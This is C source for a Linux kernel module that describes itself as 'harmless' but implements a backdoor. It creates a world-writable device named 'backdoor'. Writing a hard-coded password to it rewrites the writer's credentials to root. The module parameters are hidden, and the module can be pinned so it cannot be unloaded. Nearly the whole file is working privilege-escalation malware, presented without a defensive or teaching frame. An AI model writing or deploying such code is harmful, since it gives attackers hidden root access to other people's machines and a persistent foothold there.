// Module headers
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h>

// Char device headers
#include <linux/device.h>
#include <linux/fs.h>
#include <linux/uaccess.h>

// Process realted headers
#include <linux/cred.h>	 // struct cred
#include <linux/sched.h> // struct task_struct, current
#include <linux/types.h> // uid_t, gid_t

#define AUTHOR		"threadexio"
#define VERSION		"1.0"
#define LICENSE		"GPL"
#define DESCRIPTION "A harmless little kernel module"

#define DEV_NAME	 "backdoor"
#define MAX_PASS_LEN 32

#define INCORRECT_PASS_ERR ENOSPC

// char device stuff
static int			 dev_major;
static struct class *cls;

static char	  user_data[MAX_PASS_LEN];
static size_t pass_len;

/*
 * These parameters can only be set on load. Never again, so you can't just set
 * debug=1 and see who is using the module.
 *
 * The 0000 restricts the visibility of the paramters so they are nice and
 * hidden while the module is running.
 */

static int prevent_unload = 0;
module_param(prevent_unload, int, 0000);

static int debug = 1;
module_param(debug, int, 0000);

static char *passwd = "0x1337";
module_param(passwd, charp, 0000);

//========//

static int elevate(struct task_struct *task) {
	if (debug)
		printk(KERN_NOTICE "Elevating process: %u\n", task->pid);

	/*
	 * Modify kernel memory directly to change ids, simillar to libc's
	 * setuid, setgid, etc.
	 */
	*(uid_t *)&task->cred->uid = 0;
	*(gid_t *)&task->cred->gid = 0;

	*(uid_t *)&task->cred->suid = 0;
	*(gid_t *)&task->cred->sgid = 0;

	*(uid_t *)&task->cred->euid = 0;
	*(gid_t *)&task->cred->egid = 0;

	*(uid_t *)&task->cred->fsuid = 0;
	*(gid_t *)&task->cred->fsgid = 0;

	return 0;
}

static int dev_uevent(struct device *dev, struct kobj_uevent_env *env) {
	/*
	 * Force the created device to use permissions 0777 so that everyone can
	 * write to it.
	 */
	add_uevent_var(env, "DEVMODE=%#o", 0777);
	return 0;
}

static int dev_open(struct inode *inode, struct file *file) {
	return 0;
}

static int dev_release(struct inode *inode, struct file *file) {
	return 0;
}

static ssize_t dev_read(struct file *file,
						char __user *ubuffer,
						size_t		 ulen,
						loff_t	   *offset) {
	return -EINVAL;
}

static ssize_t dev_write(struct file *file,
						 const char	*ubuffer,
						 size_t		  ulen,
						 loff_t		*offset) {
	struct task_struct *cur = current;

	if (ulen != pass_len)
		return -INCORRECT_PASS_ERR;

	if (copy_from_user(user_data, ubuffer, ulen))
		return -EFAULT;

	if (strncmp(passwd, user_data, MAX_PASS_LEN) == 0) {
		elevate(cur);
		return ulen;
	}

	return -INCORRECT_PASS_ERR;
}

static struct file_operations dev_fops = {.read	   = dev_read,
										  .write   = dev_write,
										  .open	   = dev_open,
										  .release = dev_release};

//========//

static __init int mod_init(void) {
	if (debug)
		printk(KERN_INFO "Loading...\n");

	pass_len = strlen(passwd);

	if (debug)
		printk(KERN_INFO "Configured password: %s\n", passwd);

	dev_major = register_chrdev(0, DEV_NAME, &dev_fops);
	if (dev_major < 0) {
		if (debug)
			printk(KERN_ERR "Failed to register char dev: %d\n", dev_major);
		return dev_major;
	}

	cls				= class_create(THIS_MODULE, DEV_NAME);
	cls->dev_uevent = dev_uevent;
	device_create(cls, NULL, MKDEV(dev_major, 0), NULL, DEV_NAME);

	if (prevent_unload) {
		// Prevent the kernel or the user from ever unloading this module
		if (! try_module_get(THIS_MODULE)) {
			if (debug)
				printk(KERN_ERR "Failed to stop module unloading\n");
			return -ENODEV;
		}
	}

	return 0;
}

static __exit void mod_exit(void) {
	// Free device and cleanup
	device_destroy(cls, MKDEV(dev_major, 0));
	class_destroy(cls);
	unregister_chrdev(dev_major, DEV_NAME);

	if (debug)
		printk(KERN_INFO "Unloading...\n");
}

MODULE_LICENSE(LICENSE);
MODULE_AUTHOR(AUTHOR);
MODULE_DESCRIPTION(DESCRIPTION);
MODULE_VERSION(VERSION);

module_init(mod_init);
module_exit(mod_exit);